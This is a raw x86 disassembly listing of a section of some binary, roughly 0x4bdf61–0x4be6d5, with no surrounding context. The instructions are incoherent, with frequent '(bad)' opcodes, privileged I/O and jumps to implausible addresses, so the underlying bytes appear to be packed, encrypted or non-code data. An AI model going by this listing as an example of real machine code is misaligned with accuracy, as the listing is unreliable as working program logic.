  4bdf61:	push   edx
  4bdf62:	dec    edi
  4bdf63:	push   edx
  4bdf64:	and    ah,BYTE PTR [esi+ecx*4]
  4bdf67:	(bad)  
  4bdf68:	or     eax,0xb5c2d8b
  4bdf6d:	sbb    DWORD PTR [ebp-0x37],0x33bc2
  4bdf74:	push   0xad247450
  4bdf79:	cmp    dl,BYTE PTR [edx-0x6f0664bb]
  4bdf7f:	mov    dh,0x88
  4bdf81:	pop    edi
  4bdf82:	push   0x56890e55
  4bdf87:	dec    ebx
  4bdf88:	xchg   edx,eax
  4bdf89:	pop    eax
  4bdf8a:	ret    
  4bdf8b:	and    eax,0xf25ecb0
  4bdf90:	popa   
  4bdf91:	add    al,0xff
  4bdf93:	add    BYTE PTR [eax],ah
  4bdf95:	lds    ecx,FWORD PTR [esi+0x22]
  4bdf98:	and    eax,0x140fec49
  4bdf9d:	pusha  
  4bdf9e:	test   DWORD PTR [eax+0x17],0x45703b46
  4bdfa5:	jo     0x4bdfbf
  4bdfa7:	dec    ecx
  4bdfa8:	inc    edi
  4bdfa9:	mov    bl,0xcc
  4bdfab:	mov    ebp,0x580cf34a
  4bdfb0:	data16 loopne 0x4bdf38
  4bdfb3:	inc    edi
  4bdfb4:	push   eax
  4bdfb5:	pop    edx
  4bdfb6:	lahf   
  4bdfb7:	dec    ebx
  4bdfb8:	stos   DWORD PTR es:[edi],eax
  4bdfb9:	inc    esi
  4bdfba:	cwde   
  4bdfbb:	mov    al,0xd
  4bdfbd:	ja     0x4bdf45
  4bdfbf:	sub    DWORD PTR [eax*4+0x23c998f8],esi
  4bdfc6:	inc    esp
  4bdfc7:	fwait
  4bdfc8:	int    0xa6
  4bdfca:	and    BYTE PTR [esi+0x1b],dh
  4bdfcd:	mov    ebp,DWORD PTR [eax+ebp*1+0x16]
  4bdfd1:	cmp    ch,BYTE PTR [eax]
  4bdfd3:	jmp    0x4be030
  4bdfd5:	or     al,0x21
  4bdfd7:	ins    DWORD PTR es:[edi],dx
  4bdfd8:	daa    
  4bdfd9:	xchg   edx,eax
  4bdfda:	dec    ebx
  4bdfdb:	mov    bh,0x4d
  4bdfdd:	adc    BYTE PTR [ecx+eax*4],dl
  4bdfe0:	ret    
  4bdfe1:	sub    BYTE PTR ds:0x53010e96,cl
  4bdfe7:	dec    edx
  4bdfe8:	pop    edx
  4bdfe9:	sub    ch,BYTE PTR [eax]
  4bdfeb:	cmp    eax,0xc551d908
  4bdff0:	inc    esp
  4bdff1:	jmp    0x214d33d7
  4bdff6:	xchg   ebx,eax
  4bdff7:	ror    BYTE PTR [edi+0x792a45b5],0x18
  4bdffe:	or     DWORD PTR [edi],ebp
  4be000:	or     BYTE PTR [edi+esi*1],dl
  4be003:	lock jp 0x4be022
  4be006:	jmp    0x4bdfe5
  4be008:	fst    QWORD PTR [eax+edx*8+0x9c2e1b5]
  4be00f:	pop    ds
  4be010:	push   cs
  4be011:	fdiv   QWORD PTR [edx+eax*1]
  4be014:	and    eax,0xcf3c7529
  4be019:	repz or dh,ah
  4be01c:	push   eax
  4be01d:	push   es
  4be01e:	ja     0x4bdfc0
  4be020:	ret    
  4be021:	in     al,0xf4
  4be023:	xchg   BYTE PTR [esi],dl
  4be025:	jmp    0x8160005b
  4be02a:	xor    bh,al
  4be02c:	sub    eax,DWORD PTR [ecx]
  4be02e:	jbe    0x4be077
  4be030:	mov    fs,esp
  4be032:	stc    
  4be033:	test   DWORD PTR [edi+0x4],ecx
  4be036:	mov    edi,DWORD PTR [ecx]
  4be038:	push   esi
  4be039:	push   edi
  4be03a:	nop
  4be03b:	out    0x90,al
  4be03d:	inc    ecx
  4be03e:	test   al,0x1
  4be040:	and    al,0x4
  4be042:	inc    esi
  4be043:	cmp    eax,0xd1dd386a
  4be048:	jb     0x4be05a
  4be04a:	cmp    eax,0xb53c4760
  4be04f:	pop    es
  4be050:	pusha  
  4be051:	and    BYTE PTR [edi],cl
  4be053:	test   esp,ecx
  4be055:	inc    ebp
  4be056:	pop    eax
  4be057:	add    DWORD PTR ds:0x850d8708,0xffffffaf
  4be05e:	xchg   edx,eax
  4be05f:	jno    0x4be0d9
  4be061:	mov    ebp,0xf69aa505
  4be066:	mov    eax,DWORD PTR [eax+0x1027bd95]
  4be06c:	pushf  
  4be06d:	out    dx,al
  4be06e:	lods   eax,DWORD PTR ds:[esi]
  4be06f:	pop    ebx
  4be070:	add    ch,al
  4be072:	pushf  
  4be073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4be074:	mov    al,ds:0x27e60b4e
  4be079:	mov    ah,0x20
  4be07b:	add    ah,bh
  4be07d:	dec    eax
  4be07e:	or     eax,DWORD PTR [ebx]
  4be080:	ds pop es
  4be082:	es xchg esp,eax
  4be084:	sub    DWORD PTR [ebx-0x3aa77554],edi
  4be08a:	dec    ecx
  4be08b:	inc    ebx
  4be08c:	push   ebp
  4be08d:	adc    DWORD PTR [edi+0x1076d444],ecx
  4be093:	inc    edi
  4be094:	push   es
  4be095:	cmp    ch,cl
  4be097:	mov    al,ds:0x3d578184
  4be09c:	and    al,0x85
  4be09e:	adc    BYTE PTR [ebp+0x610853c9],0xc9
  4be0a5:	adc    DWORD PTR [ebx+0x5c],0x5
  4be0a9:	inc    eax
  4be0aa:	in     al,0x4e
  4be0ac:	add    bl,BYTE PTR [ebx-0x450757ff]
  4be0b2:	push   es
  4be0b3:	add    eax,esi
  4be0b5:	ret    0x88d4
  4be0b8:	rol    edx,cl
  4be0ba:	dec    eax
  4be0bb:	add    DWORD PTR [edi-0x6178757e],0x923c0618
  4be0c5:	mov    eax,0x1a5c47a0
  4be0ca:	or     esi,DWORD PTR [edi-0x7d]
  4be0cd:	pop    eax
  4be0ce:	in     al,0x74
  4be0d0:	jo     0x4be125
  4be0d2:	mov    cl,0xe3
  4be0d4:	jp     0x4be0f1
  4be0d6:	xchg   ebx,eax
  4be0d7:	mov    DWORD PTR ds:0xddc0cc30,ebp
  4be0dd:	aaa    
  4be0de:	sbb    al,0xb0
  4be0e0:	jg     0x4be13e
  4be0e2:	ss mov dh,0x1b
  4be0e5:	popa   
  4be0e6:	iret   
  4be0e7:	sbb    BYTE PTR [ebp+ebp*2-0x75],cl
  4be0eb:	cli    
  4be0ec:	popa   
  4be0ed:	gs or  al,0x80
  4be0f0:	xor    BYTE PTR [eax+0x7a],bl
  4be0f3:	iret   
  4be0f4:	repz fsubr QWORD PTR [ecx+0x25]
  4be0f8:	pop    ss
  4be0f9:	sbb    bl,BYTE PTR ds:0x8e5c9b20
  4be0ff:	cmp    al,0x38
  4be101:	test   al,al
  4be103:	adc    ecx,DWORD PTR [eax+eiz*1]
  4be106:	jno    0x4be0a9
  4be108:	addr16 jne 0x4be189
  4be10b:	adc    al,0x58
  4be10d:	and    BYTE PTR [ebp+0xa],bl
  4be110:	add    BYTE PTR [esi+eiz*2-0x6876fa58],al
  4be117:	out    0xf6,eax
  4be119:	and    BYTE PTR ds:0xe801200,dl
  4be11f:	or     BYTE PTR [esi],dl
  4be121:	adc    BYTE PTR [esi-0x10],ah
  4be124:	cli    
  4be125:	xor    BYTE PTR [esi+0x665c669e],ch
  4be12b:	mov    BYTE PTR [esi+0x5897b6fd],0xe
  4be132:	inc    esi
  4be133:	add    cl,BYTE PTR [ebp+0x39668343]
  4be139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4be13a:	test   DWORD PTR [edi],eax
  4be13c:	inc    esi
  4be13d:	cmp    ebx,DWORD PTR [esp+eax*8+0x14]
  4be141:	ret    
  4be142:	pop    es
  4be143:	mov    al,ds:0x92f928c3
  4be148:	sub    ebp,ecx
  4be14a:	shl    BYTE PTR [edx+0x51],1
  4be14d:	push   edi
  4be14e:	push   eax
  4be14f:	ficomp DWORD PTR [esi+eax*4]
  4be152:	loop   0x4be1a2
  4be154:	imul   ebp,DWORD PTR [edi],0x30a33464
  4be15a:	test   al,0x11
  4be15c:	call   0x5c7f40f7
  4be161:	pop    eax
  4be162:	js     0x4be1a4
  4be164:	pusha  
  4be165:	add    eax,0xbf884825
  4be16a:	or     al,0xbe
  4be16c:	lock xor esi,esi
  4be16f:	inc    DWORD PTR [edx+0x78106bfa]
  4be175:	cmp    DWORD PTR [eax+0x8],esi
  4be178:	jbe    0x4be187
  4be17a:	or     BYTE PTR [ebx+0x51f7c060],bl
  4be180:	mov    eax,0x19012b02
  4be185:	loope  0x4be114
  4be187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4be188:	sahf   
  4be189:	pop    ds
  4be18a:	or     edx,ebp
  4be18c:	push   es
  4be18d:	sbb    eax,0xa3189602
  4be192:	add    BYTE PTR [edi-0x34bde05b],cl
  4be198:	and    eax,0xc553507c
  4be19d:	xor    eax,0xc29bac54
  4be1a2:	mov    BYTE PTR [esi],bh
  4be1a4:	aaa    
  4be1a5:	push   cs
  4be1a6:	and    DWORD PTR [ebx],esi
  4be1a8:	imul   esi,DWORD PTR [ebx+ebx*8-0x5ae9c8fd],0xffffffe0
  4be1b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4be1b1:	bound  edx,QWORD PTR [ebp-0x11]
  4be1b4:	adc    esp,esi
  4be1b6:	pop    edi
  4be1b7:	lahf   
  4be1b8:	icebp  
  4be1b9:	ret    0xe14d
  4be1bc:	push   es
  4be1bd:	ret    
  4be1be:	lock and al,0xa8
  4be1c1:	ss push es
  4be1c3:	or     ah,BYTE PTR ds:0x1c86ed53
  4be1c9:	inc    ebx
  4be1ca:	ret    0x10ba
  4be1cd:	add    DWORD PTR [ebp+0x64],esp
  4be1d0:	xchg   esi,eax
  4be1d1:	sbb    eax,0x55294c03
  4be1d6:	jmp    0x4be235
  4be1d8:	lods   al,BYTE PTR ds:[esi]
  4be1d9:	add    edi,DWORD PTR [ebp+0x53d29f0c]
  4be1df:	mov    al,BYTE PTR [esi]
  4be1e1:	sub    eax,0x9140687d
  4be1e6:	or     ah,ch
  4be1e8:	mov    edx,0x99fb0fff
  4be1ed:	or     eax,0xdff09761
  4be1f2:	cmp    BYTE PTR [esi],dh
  4be1f4:	lea    eax,[ebp+0x28d88915]
  4be1fa:	stos   BYTE PTR es:[edi],al
  4be1fb:	push   eax
  4be1fc:	mov    bh,0xb0
  4be1fe:	adc    DWORD PTR [ecx+0x5355cf67],esp
  4be204:	push   edx
  4be205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4be206:	push   cs
  4be207:	or     eax,0x878e2b32
  4be20c:	sbb    al,0x61
  4be20e:	add    ecx,esi
  4be210:	ror    BYTE PTR [ebx],1
  4be212:	inc    ebp
  4be213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4be214:	or     BYTE PTR [eax-0x6f9862ac],ah
  4be21a:	mov    ebp,0x1950013e
  4be21f:	js     0x4be1fc
  4be221:	popa   
  4be222:	xchg   ebx,eax
  4be223:	adc    BYTE PTR [edx],bl
  4be225:	add    esi,ebp
  4be227:	ret    
  4be228:	add    dl,BYTE PTR [esp+ecx*1]
  4be22b:	add    eax,DWORD PTR [esi+0x7d]
  4be22e:	ss jne 0x4be245
  4be231:	mov    al,0x7d
  4be233:	jnp    0x4be282
  4be235:	out    0x22,eax
  4be237:	and    edi,DWORD PTR [eax]
  4be239:	or     al,0xb8
  4be23b:	sbb    eax,0x90536d7
  4be240:	mov    ecx,DWORD PTR [eax]
  4be242:	and    edi,DWORD PTR [eax]
  4be244:	sub    cl,BYTE PTR [esi-0x12c10710]
  4be24a:	xchg   ebp,eax
  4be24b:	or     BYTE PTR [eax-0x36075d48],bh
  4be251:	lahf   
  4be252:	hlt    
  4be253:	xchg   ebp,eax
  4be254:	or     DWORD PTR [eax+0x5c],edi
  4be257:	add    eax,0x847d4c03
  4be25c:	push   es
  4be25d:	ss les edx,FWORD PTR ds:[ebx-0x74]
  4be262:	dec    edx
  4be263:	pop    es
  4be264:	test   al,0x57
  4be266:	cs xor edi,edi
  4be269:	(bad)  
  4be26a:	adc    al,0x38
  4be26c:	xchg   ebp,eax
  4be26d:	mov    BYTE PTR [eax],0x74
  4be270:	fs sub al,0x46
  4be273:	mov    dl,0x53
  4be276:	jp     0x4be239
  4be278:	stc    
  4be279:	push   ebx
  4be27a:	adc    eax,DWORD PTR [eax+0x3ca5ce01]
  4be280:	dec    edx
  4be281:	mov    eax,0x15f0324a
  4be286:	jne    0x4be2c4
  4be288:	arpl   WORD PTR [ecx+0x49],cx
  4be28b:	sub    ch,al
  4be28d:	(bad)  
  4be28e:	scas   al,BYTE PTR es:[edi]
  4be28f:	adc    eax,0xb5ef840e
  4be294:	imul   ebp,DWORD PTR [eax],0x73262152
  4be29a:	adc    eax,DWORD PTR [eax+edx*4+0x7d8c21c2]
  4be2a1:	sbb    al,0x13
  4be2a3:	push   eax
  4be2a4:	xor    edx,DWORD PTR [eax]
  4be2a6:	sbb    eax,0xb2ae30f
  4be2ab:	and    DWORD PTR [eax-0x51],ebp
  4be2ae:	jle    0x4be32b
  4be2b0:	or     al,0x27
  4be2b2:	(bad)  
  4be2b3:	imul   DWORD PTR [ecx]
  4be2b5:	ins    DWORD PTR es:[edi],dx
  4be2b6:	ficom  DWORD PTR [edi+eiz*4]
  4be2b9:	jns    0x4be250
  4be2bb:	pop    edx
  4be2bc:	xchg   edi,eax
  4be2bd:	sub    ebx,edx
  4be2bf:	and    al,0x6d
  4be2c1:	and    ecx,DWORD PTR [eax-0x59]
  4be2c4:	mov    esp,0x19103858
  4be2c9:	push   esi
  4be2ca:	fsubr  st,st(0)
  4be2cc:	ds or  eax,0x40905ba
  4be2d2:	push   edi
  4be2d3:	xor    al,BYTE PTR [esi]
  4be2d5:	in     al,dx
  4be2d6:	sub    DWORD PTR [ebx+0x75],esi
  4be2d9:	add    eax,0xa081dd1
  4be2de:	xor    al,0xc3
  4be2e0:	add    eax,0x7e125c1
  4be2e5:	push   0xffffffb3
  4be2e7:	dec    ebp
  4be2e8:	adc    BYTE PTR [esi+0x29],dh
  4be2eb:	pop    ebp
  4be2ec:	pop    ebx
  4be2ed:	mov    cl,0x71
  4be2ef:	pop    ebp
  4be2f0:	not    BYTE PTR [edi-0x35]
  4be2f3:	add    esp,DWORD PTR ds:0x57f8ac4c
  4be2f9:	push   es
  4be2fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4be2fb:	push   eax
  4be2fc:	pop    eax
  4be2fd:	or     BYTE PTR ds:0x272c6f,dh
  4be303:	inc    ebx
  4be304:	add    BYTE PTR [ebx-0x3],al
  4be307:	lock sahf 
  4be309:	pop    ecx
  4be30a:	sbb    BYTE PTR [esi],bl
  4be30c:	xchg   ebp,eax
  4be30d:	mov    cs,WORD PTR ds:0x6ba0fd49
  4be313:	add    DWORD PTR [edx],edi
  4be315:	arpl   WORD PTR [ecx],ax
  4be317:	mov    ecx,0xe06468d
  4be31c:	or     BYTE PTR [ebx],al
  4be31e:	or     eax,0xa4d50f01
  4be323:	test   DWORD PTR [ecx+0x6],ecx
  4be326:	add    eax,0x6d20052e
  4be32b:	nop
  4be32c:	out    0x53,eax
  4be32e:	sbb    BYTE PTR [esi+ebx*2],0x4
  4be332:	int    0x0
  4be334:	ror    BYTE PTR [eax+eiz*1],cl
  4be337:	add    esp,DWORD PTR [edx+eax*1]
  4be33a:	and    edi,0xf
  4be33d:	and    BYTE PTR [eax],ch
  4be33f:	lea    edx,[esi+0x1]
  4be342:	cmp    DWORD PTR [eax+edx*1-0x7d],edx
  4be346:	repnz sbb DWORD PTR [edx],0x76
  4be34a:	dec    esp
  4be34b:	mov    al,0x4
  4be34d:	xor    DWORD PTR [ebx+ebp*4],ebp
  4be350:	inc    eax
  4be351:	dec    ecx
  4be352:	push   ebx
  4be353:	sub    al,0x22
  4be355:	test   BYTE PTR [eax],ah
  4be357:	sub    BYTE PTR [edx-0x1b],dl
  4be35a:	jge    0x4be347
  4be35c:	xor    al,0x52
  4be35e:	mov    dh,0x50
  4be360:	sbb    al,0x44
  4be362:	dec    esp
  4be363:	jecxz  0x4be3c8
  4be365:	adc    cl,BYTE PTR [edi-0x53]
  4be368:	retf   0x2b07
  4be36b:	out    dx,eax
  4be36c:	mov    ds:0xed50430,al
  4be371:	jo     0x4be308
  4be373:	add    BYTE PTR [esi+0x61],dl
  4be376:	imul   ebx,DWORD PTR [esi],0x4d
  4be379:	dec    edx
  4be37a:	pop    ebx
  4be37b:	arpl   WORD PTR [edx-0x15],di
  4be37e:	ret    
  4be37f:	out    dx,al
  4be380:	pop    ds
  4be381:	sub    DWORD PTR [esp+eax*4-0x14b844e3],edx
  4be388:	cmp    BYTE PTR [ecx],dl
  4be38a:	dec    ebx
  4be38b:	shrd   DWORD PTR [esi+ebx*1-0x59],edi,0x6
  4be391:	fidivr WORD PTR [ebx-0x66]
  4be394:	iret   
  4be395:	int3   
  4be396:	or     eax,0x169f127d
  4be39b:	add    eax,0x3dee6f0e
  4be3a0:	iret   
  4be3a1:	jnp    0x4be335
  4be3a3:	push   ss
  4be3a4:	sbb    esi,DWORD PTR [ecx+0x65c0e4d]
  4be3aa:	adc    DWORD PTR [ecx],ebp
  4be3ac:	je     0x4be37a
  4be3ae:	add    DWORD PTR [ecx],eax
  4be3b0:	hlt    
  4be3b1:	add    cl,dh
  4be3b3:	mov    al,0xe0
  4be3b5:	add    BYTE PTR [eax+0x1440dd8c],0x9c
  4be3bc:	and    al,0xe8
  4be3be:	add    BYTE PTR [eax-0x58],bl
  4be3c1:	inc    ebx
  4be3c2:	stos   BYTE PTR es:[edi],al
  4be3c3:	adc    BYTE PTR [ebx],cl
  4be3c5:	sub    eax,0x1302b7ff
  4be3ca:	adc    eax,0x1e1f5635
  4be3cf:	imul   edx,ebp,0x4008ca1
  4be3d5:	dec    edx
  4be3d6:	mov    ecx,0xa1545815
  4be3db:	shr    DWORD PTR [ebp+0x51a90923],1
  4be3e1:	dec    ebp
  4be3e2:	pop    edi
  4be3e3:	mov    ds:0x5c02d7b,eax
  4be3e8:	add    ecx,DWORD PTR [ecx+0x69541837]
  4be3ee:	test   eax,0x84dc24c9
  4be3f3:	pop    esi
  4be3f4:	pop    esi
  4be3f5:	add    DWORD PTR [eax],ebp
  4be3f7:	cdq    
  4be3f8:	cmp    al,0x86
  4be3fa:	fcom   QWORD PTR [ecx+0x10]
  4be3fd:	scas   eax,DWORD PTR es:[edi]
  4be3fe:	and    DWORD PTR [ebp+eax*4+0x29ad2375],0x8d7d027f
  4be409:	inc    ebp
  4be40a:	loopne 0x4be395
  4be40c:	jne    0x4be3ea
  4be40e:	push   cs
  4be40f:	lock add al,0xf4
  4be412:	dec    eax
  4be413:	shl    BYTE PTR ss:[eax+edi*8],1
  4be417:	cld    
  4be418:	mov    al,0x83
  4be41a:	into   
  4be41b:	in     al,dx
  4be41c:	add    al,0x2
  4be41e:	inc    esp
  4be41f:	jge    0x4be496
  4be421:	push   cs
  4be422:	in     eax,0x56
  4be424:	push   ebx
  4be425:	leave  
  4be426:	and    ah,bl
  4be428:	xchg   edx,eax
  4be429:	dec    edi
  4be42a:	cmc    
  4be42b:	or     dh,al
  4be42d:	cmp    DWORD PTR [eax],esp
  4be42f:	(bad)  
  4be430:	sar    BYTE PTR [edx-0x80],0x89
  4be434:	adc    DWORD PTR [edi],eax
  4be436:	aam    0x9d
  4be438:	rcl    DWORD PTR [esi],1
  4be43a:	loopne 0x4be3d8
  4be43c:	push   edi
  4be43d:	add    eax,0x5666b753
  4be442:	cmp    BYTE PTR [eax-0x50],dl
  4be445:	test   al,0xd9
  4be447:	adc    dl,BYTE PTR [ebx-0x29]
  4be44a:	int    0x84
  4be44c:	adc    DWORD PTR [esi+0x762b0ff0],eax
  4be452:	adc    BYTE PTR [ebp-0x80],0x3f
  4be456:	ja     0x4be497
  4be458:	or     BYTE PTR [ecx+0x2a],bh
  4be45b:	ret    0xf88f
  4be45e:	push   0x4
  4be460:	xchg   BYTE PTR ds:0x9a9ed938,dl
  4be466:	cdq    
  4be467:	dec    esi
  4be468:	push   ebp
  4be469:	cmp    BYTE PTR [ebx],dh
  4be46b:	fs jl  0x4be4be
  4be46e:	push   esp
  4be46f:	sub    eax,0x4841a40d
  4be474:	dec    eax
  4be475:	push   ebx
  4be476:	pop    ebp
  4be477:	ror    BYTE PTR [esi],0x6d
  4be47a:	sub    eax,0xe288979a
  4be47f:	stos   BYTE PTR es:[edi],al
  4be480:	dec    esp
  4be481:	or     DWORD PTR [eax],0xffffffc3
  4be484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4be485:	push   eax
  4be486:	sbb    al,0x45
  4be488:	add    DWORD PTR [esi],0xc8007345
  4be48e:	sub    esi,DWORD PTR cs:[ebx+0x1c96b586]
  4be495:	rcr    BYTE PTR [esp+edx*1+0x10],cl
  4be499:	adc    BYTE PTR [edx],ah
  4be49b:	nop
  4be49c:	sbb    al,0xf2
  4be49e:	mov    eax,0x9b021002
  4be4a3:	dec    eax
  4be4a4:	jge    0x4be4f7
  4be4a6:	sbb    DWORD PTR [edi-0x38],eax
  4be4a9:	mov    esp,edx
  4be4ab:	push   es
  4be4ac:	sbb    eax,DWORD PTR [ebx+0x44198f38]
  4be4b2:	and    al,0xeb
  4be4b4:	inc    eax
  4be4b5:	call   0x127ebee5
  4be4ba:	inc    esp
  4be4bb:	test   eax,0x203699c
  4be4c0:	jb     0x4be529
  4be4c2:	jns    0x4be4f3
  4be4c4:	pop    eax
  4be4c5:	clc    
  4be4c6:	or     BYTE PTR [ecx+eax*1],bl
  4be4c9:	pop    esp
  4be4ca:	push   es
  4be4cb:	xor    BYTE PTR [ecx],dh
  4be4cd:	jle    0x4be46d
  4be4cf:	out    0x34,eax
  4be4d1:	cmp    BYTE PTR [eax+eax*2],bh
  4be4d4:	call   edi
  4be4d6:	nop
  4be4d7:	or     ebx,0x44968c2b
  4be4dd:	je     0x4928255f
  4be4e3:	jecxz  0x4be517
  4be4e5:	add    esp,DWORD PTR [edx]
  4be4e7:	sub    DWORD PTR [eax-0x6f],esi
  4be4ea:	rol    BYTE PTR [ecx],0x64
  4be4ed:	dec    edi
  4be4ee:	iret   
  4be4ef:	sahf   
  4be4f0:	clc    
  4be4f1:	or     cl,BYTE PTR [eax-0x58]
  4be4f4:	add    DWORD PTR [esi+0x2a],esi
  4be4f7:	js     0x4be56a
  4be4f9:	ret    
  4be4fa:	xor    BYTE PTR [ebx+0x2c2b75d5],0x67
  4be501:	and    DWORD PTR [edi-0x29],esi
  4be504:	cmp    BYTE PTR [ebx],ah
  4be506:	and    esi,eax
  4be508:	add    al,0x88
  4be50a:	mov    edx,0x74501029
  4be50f:	loop   0x4be4fc
  4be511:	pop    edx
  4be512:	aaa    
  4be513:	or     BYTE PTR [eax+ecx*1+0x3c],0xd9
  4be518:	cmp    al,dl
  4be51a:	mov    bh,0x30
  4be51c:	xor    BYTE PTR [edx+0x7c],dl
  4be51f:	mov    fs,WORD PTR [edi-0x10]
  4be522:	imul   ecx,edx,0x3a9b9f53
  4be528:	inc    ecx
  4be529:	sub    dl,BYTE PTR [eax+0x1a6b4088]
  4be52f:	test   BYTE PTR [ebx-0x7705fef2],cl
  4be535:	xor    DWORD PTR [ebx],eax
  4be537:	das    
  4be538:	inc    ebx
  4be539:	adc    eax,edx
  4be53b:	jmp    0x4be53b
  4be53d:	push   ebx
  4be53e:	jmp    FWORD PTR [esi-0x75]
  4be541:	or     eax,0xd606242c
  4be546:	ins    DWORD PTR es:[edi],dx
  4be547:	nop
  4be548:	mov    cl,0x6a
  4be54a:	mov    BYTE PTR [edi+0x24],cl
  4be54d:	inc    edi
  4be54e:	mov    es,esp
  4be550:	imul   ebp,DWORD PTR gs:[ebp+0x13c75861],0x4096dcf2
  4be55b:	popa   
  4be55c:	dec    esp
  4be55d:	add    cl,BYTE PTR [esi+0x5]
  4be560:	mov    ebp,0x68bf1211
  4be565:	dec    eax
  4be566:	popa   
  4be567:	inc    esp
  4be568:	iret   
  4be569:	sti    
  4be56a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4be56b:	or     ebx,DWORD PTR [eax+ebp*1]
  4be56e:	sub    al,0x17
  4be570:	or     BYTE PTR [esi+0x468e3a55],dh
  4be576:	ds push edx
  4be578:	jae    0x4be519
  4be57a:	cwde   
  4be57b:	ret    0xb13a
  4be57e:	rcl    DWORD PTR [edx],1
  4be580:	pop    eax
  4be581:	add    DWORD PTR [ebx+0x25e25cdf],ebp
  4be587:	sub    al,0x6
  4be589:	aaa    
  4be58a:	test   BYTE PTR [ebx],cl
  4be58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4be58d:	pop    ebx
  4be58e:	test   BYTE PTR [eax+0x40],dh
  4be591:	inc    eax
  4be592:	lods   eax,DWORD PTR gs:[esi]
  4be594:	rcl    edx,cl
  4be596:	je     0x4be5a2
  4be598:	fstp   st(5)
  4be59a:	adc    eax,0x89c67e46
  4be59f:	je     0x4be5c5
  4be5a1:	sub    BYTE PTR [edx-0x48],ch
  4be5a4:	sbb    BYTE PTR [esi],ch
  4be5a6:	test   al,0xf1
  4be5a8:	mov    ebp,0x50a210c0
  4be5ad:	or     BYTE PTR [ebx],ah
  4be5af:	sub    BYTE PTR [esi+0x6a1b2303],ch
  4be5b5:	mov    fs,ecx
  4be5b7:	mov    ecx,DWORD PTR [edi+0x61]
  4be5ba:	xchg   ebx,eax
  4be5bb:	or     BYTE PTR ds:0x26865010,ah
  4be5c1:	adc    DWORD PTR [ecx],edx
  4be5c3:	adc    al,0x43
  4be5c5:	retf   0xdb10
  4be5c8:	loope  0x4be5a9
  4be5ca:	rcr    BYTE PTR [eax+0x2],0xa1
  4be5ce:	dec    ecx
  4be5cf:	jle    0x4be559
  4be5d1:	mov    ds:0xc2531581,eax
  4be5d6:	and    eax,DWORD PTR [ecx+0xc79934c]
  4be5dc:	leave  
  4be5dd:	adc    ch,BYTE PTR [ecx]
  4be5df:	and    dh,cl
  4be5e1:	adc    eax,0x7c60aba2
  4be5e6:	ins    DWORD PTR es:[edi],dx
  4be5e7:	inc    ebp
  4be5e8:	push   0xccc1f968
  4be5ed:	lea    esi,[ecx+edi*1-0x56]
  4be5f1:	adc    BYTE PTR [ebp+0x137d7640],bh
  4be5f7:	xchg   edi,eax
  4be5f8:	dec    edi
  4be5f9:	rcl    BYTE PTR [ebx+eax*4],cl
  4be5fc:	es pop es
  4be5fe:	or     ebp,DWORD PTR [esp+esi*1]
  4be601:	inc    edx
  4be602:	cmp    eax,0x6e09848
  4be607:	or     BYTE PTR [esi-0x31],cl
  4be60a:	mov    edi,0x2912ae3c
  4be60f:	and    BYTE PTR [ebx+0x4bdd833],ch
  4be615:	adc    DWORD PTR ds:0xf18df230,0x79
  4be61c:	or     ecx,DWORD PTR [eax-0x20]
  4be61f:	pop    ebp
  4be620:	and    DWORD PTR [edx+0x20],esp
  4be623:	push   edi
  4be624:	mov    ebx,0x8401e42f
  4be629:	and    al,0x60
  4be62b:	cmp    ch,BYTE PTR [ecx+0x44]
  4be62e:	repnz dec eax
  4be630:	sahf   
  4be631:	xchg   ecx,eax
  4be632:	add    ch,BYTE PTR [eax]
  4be634:	add    al,BYTE PTR [eax+0x2]
  4be637:	xchg   edx,eax
  4be638:	addr16 in al,0x1
  4be63b:	push   esp
  4be63c:	add    al,0x18
  4be63e:	add    edi,DWORD PTR [eax*4+0x4503c81]
  4be645:	aas    
  4be646:	dec    eax
  4be647:	sahf   
  4be648:	xchg   ecx,eax
  4be649:	ret    
  4be64a:	jae    0x4be6c4
  4be64c:	or     BYTE PTR [eax+0x4],al
  4be64f:	mov    ds:0x70f26a14,eax
  4be654:	or     BYTE PTR [ebp+0x54b1dd44],dl
  4be65a:	test   al,0x38
  4be65c:	popf   
  4be65d:	mov    bh,0x28
  4be65f:	popf   
  4be660:	cmp    BYTE PTR [ebp-0x6d],cl
  4be663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4be664:	cmp    eax,0x247c6506
  4be669:	xor    al,0x23
  4be66b:	fdiv   DWORD PTR ds:0xd3bf8946
  4be671:	add    al,BYTE PTR [ecx]
  4be673:	inc    esi
  4be674:	cmp    ch,BYTE PTR [ebp+0x67]
  4be677:	or     DWORD PTR [edx+0xcb9a604],0x7b
  4be67e:	fimul  WORD PTR [edx]
  4be680:	and    DWORD PTR [edi+0x70],eax
  4be683:	adc    al,0x3a
  4be685:	inc    esi
  4be686:	pop    ebx
  4be687:	inc    esp
  4be688:	xor    BYTE PTR [ecx],0xee
  4be68b:	sub    al,0xd1
  4be68d:	add    al,0xa6
  4be68f:	rcl    BYTE PTR [ebx],0xd7
  4be692:	push   0x39a3448c
  4be697:	fwait
  4be698:	cmp    dl,BYTE PTR [edx-0x1cf0343e]
  4be69e:	and    BYTE PTR [edi+edi*8],ah
  4be6a1:	and    al,0x60
  4be6a3:	or     ecx,esp
  4be6a5:	sar    DWORD PTR [ebp-0x2a37e594],1
  4be6ab:	push   0x18
  4be6ad:	push   0x63bb4a48
  4be6b2:	jns    0x4be68e
  4be6b4:	loopne 0x4be705
  4be6b6:	outs   dx,DWORD PTR ds:[esi]
  4be6b7:	ja     0x4be63c
  4be6b9:	out    0x3e,al
  4be6bb:	push   eax
  4be6bc:	push   edx
  4be6bd:	sahf   
  4be6be:	out    0x90,eax
  4be6c0:	add    eax,DWORD PTR ds:0xf2505c44
  4be6c6:	cmc    
  4be6c7:	(bad)  
  4be6c8:	dec    ebx
  4be6c9:	pop    es
  4be6ca:	mov    ebx,0x70b97369
  4be6cf:	nop
  4be6d0:	scas   eax,DWORD PTR es:[edi]
  4be6d1:	rcl    BYTE PTR [esi],cl
  4be6d3:	cmp    BYTE PTR [ebx],al
  4be6d5:	push   esi
